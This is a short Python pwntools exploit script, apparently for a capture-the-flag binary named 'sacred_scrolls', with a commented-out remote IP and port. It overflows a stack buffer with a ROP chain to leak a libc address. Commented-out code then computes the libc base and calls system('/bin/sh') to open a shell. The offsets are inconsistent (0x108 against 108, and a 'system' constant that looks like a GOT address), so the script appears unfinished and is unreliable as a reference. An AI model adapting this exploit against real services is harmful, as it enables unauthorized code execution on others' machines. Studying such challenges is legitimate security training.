# -- coding: utf-8 --
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./sacred_scrolls')
lib = e.libc
r = process('./sacred_scrolls')

# lib = ELF('libc.so.6')
# r =remote("206.189.116.117",31529)

# VARIABLE
setbuf_got = 0x404020
pop_rdi_ret= 0x0000000000401183 
ret = 0x00000000004007ce
main =0x400EB4
puts_plt =0x400800
system = 0x602f90

payload = b"a"*0x108
payload+= flat(pop_rdi_ret, system, puts_plt, main)
pause()
r.sendlineafter(" tag: ",payload)



# system_libc = u64(r.recv(6).ljust(8,b"\x00"))
# log.info("system_libc: %#x" %system_libc)

# base_libc = system_libc - lib.sym.system
# binsh_libc = base_libc + next(lib.search(b"/bin/sh"))

# log.info("base_libc: %#x" %base_libc)
# payload = b"a"*108
# payload+= flat(pop_rdi_ret, binsh_libc, system_libc, main)
# pause()

# r.sendline(payload)

r.interactive()